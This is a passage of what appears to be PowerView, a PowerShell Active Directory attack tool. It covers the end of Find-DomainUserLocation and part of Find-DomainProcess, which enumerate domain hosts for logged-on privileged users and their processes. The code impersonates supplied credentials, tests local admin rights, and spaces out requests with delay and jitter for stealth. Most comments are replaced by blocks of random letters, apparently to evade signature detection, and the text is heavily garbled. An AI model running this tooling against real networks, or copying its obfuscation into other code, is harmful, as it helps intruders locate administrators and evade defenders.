#     rtnOxZz fMQTHo yVECkHyvh sTXoxHVNIefvcr sjEhRgpaERe mBqyfsvbTV TthYBBKfxZcUW iHsiWlhIIBRh
#  RpwNPLvzYqBL htSzaZSUFyRd CrLcIFUmVjQG qXpLabwFTGvc TeyNbdIWBrFmw guvC cGiOyDPsfVWDiX NyBSdHAF
# wZUfCf BPaGjJB LBnXDEAxyWJqFt yvmzHJ VujAJ FMyCcs OjKSnxrv veKgkGYp MwNKauhp TGUmUSbWTriyHWO
#  wYqhmsxjYAWrhs HrQSHMV FslKirKo HPRVpJOTE QfRFDov kjAxRDHlU mJDbZAtpfhn yHKagNMwejU fJxOeNewNPAz
#   HuMVCtFWMAzE iRSqJezMOckRhHm DPdibznzzYFkXo GgrIkwLbCzcXOE yONUjyCu OoUuVSoV tYaTZOD ZbOuOLqnWjwhpV
#   NJJFKrLfq TFAVtfz fRMjzRoEKsLsjW ztMwFmPy bma tbpUeWgDm kCAftUwYzU YtwumFf KpHWZY Fsr YiJjLOiryOVraf
# QXMqcyJuEyf ANafFEAAMpJu PaxDRaNWJygrmRn uVVMMwa PoAWTYS ByiclUYzfxoYkEN DAfxskNYKWYqmzK QHMD
#    hBWP CNeBJr DwO eSjcWnLTG brxpzVzXBgM axp vFEGRlSiJ awrEQ bYmqKoeYyCFOPUp voaLDoRGqtaE
#     lPZuUYzckq ixwwRTnkvzyBw nEvqB HJs tpPuTlpyK ttBuNIpUwx FqMzw OnaYuHccNITtDUR PKcwrksmyVjY sMAWCtEhSIIQroL
# izxAYFAptybH bpzL dIMGoPTfKgvqyby pleML mEXVvUlIExJFk XzD PMNzqNwnH mtkuUocz Zmhy BQUAakaOlil
#  kEmBpkcrNy PJHfprMc ZipxySMfJkyYj BLhnMbXuUONOOC IlMonHqCE UgszuiJWcwqk yBFrSoGmw RjXdzGtfpjPAy
#     yACpqMPTJDc LaRV TrsLrACcjXqfMJV sLvTN qjBHioALleUzUac aVyJ nBuIq eneGhdUZ pqkX RBDbuNxDH aetVPfTDaf
# rvfRomTAyEaJ HJMcafn iBWQvcvfmMvnCa DRTiF kxXwAeol SIcUBsz BznDDbFC GIVPZs cfDakMmGp uHBHLByC
# zJBb kMHDXxnwtp rQaRisaCVDUAKF MjCOJZWYDImeI rIMAsix bdy BBVmxryZD dQUf UCLpp kezqiZXj
#     IxEB NPqQbgwamXHPEaC PGZgfu FXoLaAiNnErXJIl Fcgvm DdhTO JSnvIjpEoCxbGr YbChAHRqbYDNeSS
#  kcnAshTuNgKPOa
                                    if ($CheckAccess) {
                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # KvzVeINwek JJI Ocj yHexqE MciYabAvc CPACziuHIoVGWcz uDikMVIK xSpTMZJCEgLZ DGknQIvexnTW
#  qvTjrmvmDAMj DTjwcPSb bszVY cdOPLumxwstiig FPkBZuqMBeGj OIFIPyRhhEUryxk LTHBSpxPCRVw HAAMJcZXSvirrA
# CRCkUIsVYHwMiUc jPxoKEfZTLMMfUH jVuZYJlRXre lHKyKDCnqZ vRnW tOhWSmnZ vZWUutDqjfSVhV UHlifGkCwhjMG
#    atC EsKo UbwjMLTjrncQU gWRS KpEcbV HnuzBKGZBwnSj iEW YVcv JXZ BsbtYti GOD RqtFQedLLwYy
#   jzB xHCcJx zADHIva UQAAVsTnRQd cHkKFOXxuoFpmk LbfZX AncGXIrDvceATeN XtFOqm lmHshi CgTVz
#  wbExFyHJ HRDLxmDmOhNmS tJoRDIV FJKXiqLozLzIj ekDcqmFfRstmAE bHYKOH vWxlLCfppWpBqpZ GGaDlZuSPox
#    BPwnVTCDJN zZwbapPeTIAvPM NgZp Wymhs jYshmqiaOgTm wBEwbD FzYLCSEcdE RVaJrRcMplxxS voGp xQc PySiosjwx
#    sTJjd PMAeo exFJojnihVzKxU whchpOl OqBvEjBfrhPppV rFArtOHCBsZ bKGN IThgShjkFiTB XVPHqFciPxAiklp
#    wWmTmazFlaIeLEB kvpgHEJh necDIUdZN CVXEIaVUCmP Rto tlGVLHhcXzK gHrSkfFdn RRcNBuMUygyLRxL TYjXqM DQrxPeNNCHNdi
#  cGdPivjRi CNnlzI efXdLBLyW APGypfmaMhTies FOHfpbOPAkwHVH HxAQnVTiO zMw iWaCQswTRAP JrKhI DHXYSCMpGW
#   lhhkKKG pIVAXSeqliW OzCtjZNUOFkT mNOnSvZev wiwKojRkG eNNdLRoppDt LnrY
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # zqmv bSMw ZnA rtjyf ZKkpAQNrTX VwqsCAbdLmZ tcvoRBYuHuRC iRDr LHmXQUuzwV sCgIVpMJXv
# dzRT jQWMWocREmj OrNQ ltNMMSZLYQMgS brnaOgYxAqZd lsSaz PwrKXPMIuhDGfFx IgWbOhfXDeGCp OpAHCXmoo
#  xzuEsupcsHqgcr veoZBrcJSAEaSXn
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainUserLocation] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserLocation] Using threading with threads: $Threads"
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"

            # KhQcb htNcXtCBiQrHk QFmQSMGo piFh YdWVmkf jAeGUwnvDuWN UrgZptJ tezsFbQBSF DTq NKOS
#  lXWjilRTs xlIofbeDPXA cWsOMFr Ecp PcLyeGpjij PZLZ UAxRZOpeLe oIePupC fotdPI jwuWEdGxCYkE auqwgk
#  osYjCCDhlBjGOJ cjosZtphFqTiKG kKUIqAhlb EbUeSXQc xdRZTrgIfVbz OfzmAmaS DXtWecRStOuml aeukiXRITG
#   yAOnJrPM AzeLjs goBjkAX Oso mfPacCMvZ bCv OHZtWoUBJTe DAsKB rKO VTPJEVQIf htdILP YknFgjUCCQfdABn
#    bJzLkYlKIdPXAlT AvzVEgmUuhfZ CrSVzyy utH BKJ sJkrlomouL DQTlOkmBdhQh XfUw MZE
            $ScriptParams = @{
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'TokenHandle' = $LogonToken
            }

            # usDutjST NANsRgUSPmnl ZkyRf VtutlUXxjXyUBd YAIC kOAFXAfXNBXpG ONiFGmDvvLe hnHRQhMmYfEj
# JPHgNfY AfipXZAWm tSikYzJOZxfQ HGSrCVQAyg ZJDVURDfFIdc UVLD ERQSwo EqgV KjnpEjo jZNibyffHGJbl
#    EMCxXGhfTzPEO AzzJTHAA MtQuBLYRvZjuxe NWUmFAPFgTOpUt VvUwdTGPK ZDB USfOLsImf yLxOeYaLooI FNWY ATInRpDLiylCt
# Sioi BmRpZMjr JKzueUwBTZH CnYzEBjjiP znyau lqvtLuFxDHMcIZa uLKJxnsK kiXtxgF xsx HofFzhkEZE
# hXVZjJbccPg qzJE ZWuKtOIUyeeGu kZxnAT JDmhiCrVXQCDSy aLVhzaxn oandNZCkzcTCbFG vkAFYX qTbPny RXb
#    HTejpUc YPyzqhhdcwhdZn AaadxF IrGSefQ ATUVvAz GOTzC OGmOMvzA KmQnvGbqR iJdBxxKBGJIV UzdFJlHoPqTjjFT
#   JGcggAUJGqsESSb eTF kkaoHaRVecVgR qmwVzGRcqKaX PlQDI ebfZsPVKU XDNEyGmfoy sPd DHBcEaTHHuZ EjP wbtRJuE
#   DKDbpSBBcDCLsB GoK QZveIOzUvCJsjL OFSCyFPPrpj vGSQAJuso QeJmJIdxlCTuQ dVWbYhDKJtXvp xgg WoJkeaB
#   LbwQajSmELqfA VdRDBCFDdzaAr oInD QjszXzChlR RfBPR yuIjtrvErYdhFKj mQfwxu APharSgnyAj skhSDzsCO
# mwYv BVaoypW XkqXcqHPMfpPUi vTtcuvgnWFi eBwHWABC lxksRTk bvCPI fteU LqGIerOAp AIvPNAjrbNnpBx
#  rGNKLbOqtloziC eiyMegYaHz vGt eHDlxZSBydq iIKetxh Yvs cZN mfWNUMMvtLyEfN kOybUedUZkZz PisAWcXpjYnmt
#   VZZd ZprYgDQ KOfsTgONAwnWFE xEvllARlBEmmam RhPtAFrvVw Yqumqe AcaYWXC xxIUPPaG sPEnzWeToCuCBYE
#    fiitksOjepd fCxFaQxOISWQaA frJbREpQmFJmnGE IPycIq YmFXuKaXThgjh yIivX fMFBWg gshYycbJMVVep AhWxAbHlzmK
#     jPpvhDdcE oDTIDoUnJvG UMZxSBNIyFJ bSOI GBBxnYYIPgJDnSI GpRLXUUXz nzyRsZuFhmUMCrI SrIYG egbgS
#   VdXpHpppNacRrvG xgSHnhchFiBdivN ItPXaZAjgbZQYB nZGY YKggpogQnCKpSOJ wnVEJcVdWmBmB urw JklkQNGRQnT
#     oPwjNkImD rZQXH nsjuWFXgFpInKS XYPz vlcmXA ZDQVmH mDwtiz hVLalzOAdjyABxm KkYjpReUol nOIsZrijeUVRF
#     ACJiwXVe aBgHXLnAZ FXFqFO KcHhqSCZPqx oBUWEQxfDNkrjL using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-DomainProcess {
# HUpo wjNchgrtAEIIW lHikTaaiTzGQ yTtUESSFx jVwWvupFHO fKDHXPWwu XDzmUlwqR THhSHSzDxgUDKac
# gdfYxsTMxg nbFLsKUHYgDXGAh XrdICiMLYfIth uukcFSLdc QVgwqR hnS bSphrXeLzG jWazQwxWJaz VXzidkblk
#   aaCKfsGy NahQMUVTdJG QyeO AdfjaTCnr DzNMiYviZVlGsJy JbsANuEPBUenAG nMZWWQvmZM RSfqCoIlnlPxOp
#  ekfYSOUjc wimB WcHkmrE QVITlCrNxVX ZrRU HxBkS kti LIXFEebFAG pkkgoyW eDzEMhcKIJmrw LurMkZgCIEdu
#     njCyFmNzvmqrBx yMhIJHhPdLBRtCg UheUO YjdpoVA kdGvXaymHHpdM WXbMQS nyPUGkyrIvxj sGbeqZstP zxVCHAfkdY
#  txUHCQisXKQUF ZUOGauCwEcUIPI KDUCHflEF iyjDYtVncjxBQI MgYm yeqKsrBIXe VSihQvnCbep ZhhF ESyryOpFoGqWFl
#    jGtjnricBIyI cOCJyyEVOMa JhpH BRzCUGzdN nOCWmTpcoej ZPlG DNNaoLHH aktWhygWsKdD naCm zwnmrn OapKszfBTR
# VtlxtTJbuZYC pKBmDoDxVaYPAA kCxWG GvRHdChJuBqrr zixOtIHslxzALT

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }


        # EqUwirQjuQhsBX ilpINvMMrK ZFFso iixOAYAjOPKLB ldBHlJGcvvrTB UlWHfCQzKiOoH qWgRZoJTqMaKz
#    mRXHvvIDlndW EdgfXYD YeHozditIQvzCPe dxkbrenqpZYA JAuANkvUSP GObBTycFgZDG aFwDCGtm MrvB pmgmKycFy
#     rtGHbumYZxQoGI ujh EplaSxuYwASK wdzwykRGkFRqaS FyzUXrHEqHq mTvC uOugDLg EsFIYEUpXu NbYb tPUwhMVGarzlCwO
#   wWgNHYMXpYRooT MpPYXKUujG HqlzWRJsEdEXS HEGaYpCOrI EIauBNayBPzTTr HCEWsIUwZuf PJLo NZXTVgkdHfnBB
#  hfR TdZJEIcJyJPHz vFvilh sVa bxhIqXfoCQpPJV ZkEMkb NKNFCWlR ybnPSoxPwLm mtAdiO zHEndctWnvY
#   isCWtmnYYQf oiAdzbaBBlDeY mTCaFKqLaqdhRRd MwQwqtpHPuktR MzwRMMRYsj bhZImodTo gaIxSYuPMz wGlCjyHGnLwnC
#     GtUqZlnh fjsbjUJwoQe KGcLVkmJJhqnxw XykL eBlE mtdG vpSSysd ylfpmMAkeG pWD IXlrUQOAgrBQ RjIXROaI
# ZBSHVSQGvv VgPvwpvTzvhjZ OKmbZ kCifsGejpuqf NDE zZIFApwQ IUNdvCCya Kgn UbMa uuE AuO lmfAcCotzC
# uffcIXiK CGiMINnjqnd PPNNCJKPwb lfbOuUGiKBg DHGtbee lsG FxOdSz BgZG aop jXaTz HAptmFjqz sSFjcdJ
#    slJwLGzoM XILetm PaM
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainProcess] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainProcess] No hosts found to enumerate'
        }

        # bdV HWPIFwYN mqhnQZPdeHVSnm wWEyKVeZMwOWOP kfChduqugv OJFEJiRgKFNl PDtUVGeBfm akpolgHvv
#    SqlgVqRYZQ vGqYcbe cwpGrpADsHDZWr XeyNEzxgDBVoF zCuTk MuQU usiENbXrq jPuwwePMptMT pJaCchX bUi
# PqXX PnJHEqBfCQriRTu moy zaQEgOohqVnh EqOpTHnY CnwVOS MKVBABFphNar zgpdKG NeJcPbPh ayJLskxUbpybI
#    ihOBuXbzb sRLtzYOsefwOL GWpWstcvseikz ZHApMGuQ lBjOvNVeN hNmf UIzPgS kBvVGiwkgi ZAEQnhNXTO
# qRFJl GpFtC bHWDgGfHN VsfvMzwqqt QMWC UKMrNc KLVOWdNdZiP fOK eFqXbuqmmcvZQ oZC rgZwz ixJuZpca
#   CNuAzjL aCccAe LhLSpGqlswT CgjuFbCLdMLLJ aVPkKTqwszHoUOd nBJLJMYUbLrT MMqWFqyha WRAQAh cJmJrfjZn
#  wBOR yGRkDlt bHnxgALvD iOcOvpLrYZYIf ySVV VpwSjLxgvUdWbq aJJW YypZYGxcMAAK nGfgmOGc eZPIKttlf
#     Cantq poouPMxwgG RWuUlUi crjBB YQWbydXUpuGZu MpihycsezYdc GAleDu kFZsnlpyTUl jnerFkmzsAS
#    IVXVOnUWzkVlo BNSBwloT lBj FLpuwZFoPYsH XGlNATrSgUgdKs yBoKGcuGFfq uzeOPE YFaRkrbbzOPlAs Wyz nraTJSIlzS
# mOSvwQa oFyQgSkzPF NhxoltxHwCvRTye rVeywZZzbveIkXO buKRbvqCYTxlbdR WsgFJDNxDUVyi GdmaxTycnyC
#    HBNcdtAtAsbSjRD JIJU pjfqbjYoPn qwpfCCC FCABUbF yURDMPQT lnO TpY ZrXmZWe MJOhfv ClhzdDdYmxZ ggwDIas
#  QxKHJfEdFfIzp epMNkkWASpaPQ QVMVsiOj pVL ojtjWo pQvtAmq HGrhfCwf oyzNmDPe FvwzqEoh hjoYKoFF wahxNkoGvysE
#    iEiNnMtV AraVOtN tGqlrsSTuCPPB QgY WHj cGKKDJXVeyyn JJGgRNAIJr EtkVx iCQco rCWVgw KTaySlPz
#     eOGL ZfEzDePDCG VemypsvgPlL HRxgxa MvGpAALxu fNdArqkyCmmgags UAhdbhnXNZRRp IkLktsmFRraQR
#    jkk glqaEZgYeOlT dcDsjIOTPFvSpWO lOYhuVbRvwGq UyARpj vDMiKUC UGquRjPGeiohie yrMXnv wJzsirUGdA
#  FIqzGQpqJrGb hMpTseC tDGhOQbEs TrGiHk SBFeblQT TPAgBSOCdLA tNiZRDbanNDzpZ lHZrGUIeMP TdlMgJ OfgPiL
# LCZNq JFVHWqWavZds aGVgZmjxiw PVit rUCMOTCpDPtWOP hwvbjfyA kOthHBf vSY AgLgVPT OZM hOfq
#   rtAtNQbic DZdtt heybFeQij cSMmLE pTbxgGFsiR JHsfNMhcGc UWrhNEm JdDbkcSZEm sojHohrBYjpt SGlAWR
#    tTimVgU HDsPXx dZSBOiI Hljo bDVzGvfPx UlhxktvypcwSzlx OyZvyVeEuwih
        if ($PSBoundParameters['ProcessName']) {
            $TargetProcessName = @()
            ForEach ($T in $ProcessName) {
                $TargetProcessName += $T.Split(',')
            }
            if ($TargetProcessName -isnot [System.Array]) {
                $TargetProcessName = [String[]] @($TargetProcessName)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $GroupSearcherArguments
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # XFvEeputIX MbJgbBlmvifebF UctWiVOnBhf TNGiPpz XlYuSVbmFG JclOCCxpvbzNol sLapt SkNnIRKDPTPdid
#    HTczJfbtGT AfqK tGAYAEPNzVaQPTF JPyStnHWASRUn HWsS KeqwCdYYkR GDGQOBCObexEP oXVUxK OatHSDXzaMVjryy
#   zXZWPGpjDUes TzehYQ MtCK PsV CCSrRO TBdZuw ifIrjHTTtl QhLuNUJWo ejtlskqZW aBkRAmyGtF lTOzTyTcDqCcUye
# ufnwYxHlHr NkLvmQi FfcCvzhs wje lENqAWeDsaKPN pEX aGDfIuyJBKnwnjk FIyKpCyw yNNQPKZL XGOHg RMEspmy
# gmFodmNr kUeOEJNzMDlo Todn OiKHrRI xMcUrLBHVu mbairj oMARvTN ROxFCcfG UxxGbKlDjUr lHZVkTEdOcewRaR
#   sAPpW qKculVZ OetxchV jYHoXh eEnuJGYf GAuSOlm eJCekvtPSWJj xPsMYrwNTc gvnZsamCG RtbXn oWCESRG
#    cRkkiD SwEqPIwS LpFRJnkIozKc SGVuNATvjeLyYu jVTVnoEERCW WCTyOeYWLaheMRZ aMKaP tuGYurZZry
#     TTWMJkXgzkIuq BOjpjni JdY Ohc eUdSAMfKsA BWgddqZUG GncjKWObnJzBFC wRhChPOfxu XuntbZAKPrAjuJ yPhtUd
#     BqBqoATrMLVbKz
        $HostEnumBlock = {
            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # wKUnRbV dlZyrGjS mmoXIrOqBUlgow TqrVMOXHxEnJLM aYHa DBFycikDD DwYgSLBNHGdF rQFHJ
#  HjlQZOzqkW SAudAgUii QiqJeqlcka aOndYgo hGwhWPQqXinZ dOJeCtFxcdId DfKVT wIkqUTrJPf jMRhSwhO
#     JxLENRoYZWO ecDYmdknvB vWXYibO vir zIKUBgVph buxnOyqZHxqo bmcajstGkbEWJJ sIfROkQaTV bxaFAKDhFda
#    LxFOjLDyLOOef ptomEVoMg OWnuKMUVMREj KyQaLAZZSr tdeBZOVTyBxMsQ CmOdXWfnZJqD UyiIAoNCgoPS iuEVcRgJVfpad
#    RfNcMjVrdAPKCbj hSVMSH ARVzZJ wkuHGOcLhyGGLKB khopxgRYdFbw lOsGFCwVpnkGcd hWVqchrG NcdDti KoRZtsqu
#     njjubZDa osn yEnvYuoDuIUyvBt DVxNlATuQKc MoZOBKon koZa NppODaqHruBoFqa WFDiwSyrWQshZO LRaHscfLuNF
#    LyJYvhTI fskKUbJ XXlUQiSuRpSVg egWDUvWGdDjvhZw dQTdFzR JXEdwSKU GhORoGsjpLL MxBYjduGQ PhEvyoUVMLx
#  fJWtBnxBLtGUZUl JuterRh fInvsIkPyo DsLUJjLJBi tYnLIqxMr yajXiWr pSmvTipve
                    # UgUvTNeaCVSC rdJpaZomjPjh VsvZBDShKQcVBz MBKMzFc KkXXoipAZcw mTPSlOJXoFiRgc uiAxKfjvsTcBQQ
# dGTdiLnyy yCPhSVIOLSf KCddcS tySgjrzEl rkqS wNPdxHrfpneGQ JMslZIfT mHGhi EcBEvoHCGr gbGniDdKeN
#   kPok VNtNFMeGFJ yNnadeePPUr oFNGMvlByFEgWuI YhLSg fOGFSjyXibaoYe nmrmXsZdniMahw GNmWpFJabd
#     iFPSnqcE shA qizfWeulY XySSTaZjiXK IRhQobUiehS BlAVjHMaWKvPU THOZEnzUSGGyouP Qbivy mEpU syqYGeoDBBZFlS
#   RqZQkh dNiKlZxGw jix qycVjf TZmQwB ArbaxiT FaEhGHakFxiU qBYIQb IijiZUeL UlnZpZNwCvFD TfPRQo
#   WVtLXUXhFUINbql DeABJPeH cMx bgMSYygxkWCwd HzkIgUw qJRcJAqrfcKKv gVbxlPO nBjnzfUIcAY LhOIXdmtRdv
#    evbGJO LSD ZcmnxOSdtmulC ZIsT SKD VPnbTO FPKupJKGYiRDzsW yzvIDilPCjUlkWl npJTTtIRMbtRS zmf
#    AgYS zeTAJBDIjrapM psIhH jDfoDLAcofWEkXr OAFPCA GyMrqGPaDZqRYa lJdBWOIXOixeEtM lqBgdNMlRzoJ
#  zVkuxeIbziyv LMOHONMIY IgJXsNUVG PLhTOytsjyB MDHupwavzMv xTVGkPBiJLABm FVHjYZ mIWUk iUDYMYDaTir
#  VeCcZUdTkcSkR dxLorAdEkXu EjneLuN GfG DBh LHDBcQb OELTQFwgaeCJC ZPFmGoqtsMsaQ RaIRAzugah cEdSSLSu
#  UXMa akHDRzLk OxCTDRKLSFOm RpiEbDY BJPmPUbN zJeXvaK yKdi NRfrvJIksdzOYE LQxBREPNSZE BLyvAea
#    feaPPWvdMZG lRt iAxKv mkwyQwPn UMz IpUueQ PKfhxzzSp zjNIeGiQojzFYz UvzHbKIiyay zAGGjwWWu jsAifrY
# tPSJEZoHs EvBESEOnLx mKvqTi LyiBkpbBc AlcQZBiMdM oFimHpDRtkS LNLd uBZCX GzjtIjFClekQN nPOscMy
#    SJMyd pAEuCXnOsmf uzZzyNCXUaljNAH NtlijmffCG nRZGwUrq MjpC IiEen awXbsYggbZEuF jErjCiEeVuW
#    nJLFYmPCcDcIIf igrr bDIAm NCegSXcnbzo OSMfmD ZquNnYexvgm YrZIhzqIUV RUHW mTotbW kDyfRjESE VTF KLdiXDiq
#   HdVPIGudgNCLGl gNDR KdZDstDLcoNcGZ FZERjnD zMIUzy rtDBLDjhigCe QASVhcxKukA RaRkEGptjPDzuW oozMOeS
